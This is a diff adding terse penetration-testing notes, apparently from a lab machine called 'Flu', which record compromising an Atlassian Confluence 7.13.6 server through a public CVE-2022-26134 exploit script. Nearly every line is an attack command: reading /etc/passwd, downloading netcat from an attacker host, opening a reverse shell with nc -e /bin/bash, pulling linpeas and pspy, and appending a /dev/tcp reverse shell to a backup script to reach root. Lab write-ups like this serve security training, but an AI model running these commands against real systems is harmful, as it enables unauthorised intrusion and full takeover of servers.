@@ -1,0 +1,29 @@
+Flu
+
+	
+192.168.245.41
+
+Atlassian Confluence 7.13.6
+
+https://github.com/nxtexploit/CVE-2022-26134
+python3 CVE-2022-26134.py http://192.168.245.41:8090 id
+
+python3 CVE-2022-26134.py http://192.168.245.41:8090 "cat /etc/passwd"
+working
+
+python3 CVE-2022-26134.py http://192.168.245.41:8090 "curl http://192.168.45.173:444/nc -o /tmp/nc"
+python3 CVE-2022-26134.py http://192.168.245.41:8090 "chmod +x /tmp/nc"
+python3 CVE-2022-26134.py http://192.168.245.41:8090 "ls -al /tmp/nc"
+python3 CVE-2022-26134.py http://192.168.245.41:8090 "/tmp/nc 192.168.45.173 4545 -e /bin/bash"
+
+got shell
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+wget http://192.168.45.173:444/linpeas.sh
+wget http://192.168.45.173:444/pspy64
+
+/bin/bash /opt/log-backup.sh 
+
+nc -nlvp 4444
+echo 'sh -i >& /dev/tcp/192.168.45.173/4444 0>&1' >> log-backup.sh
+
+got root shell
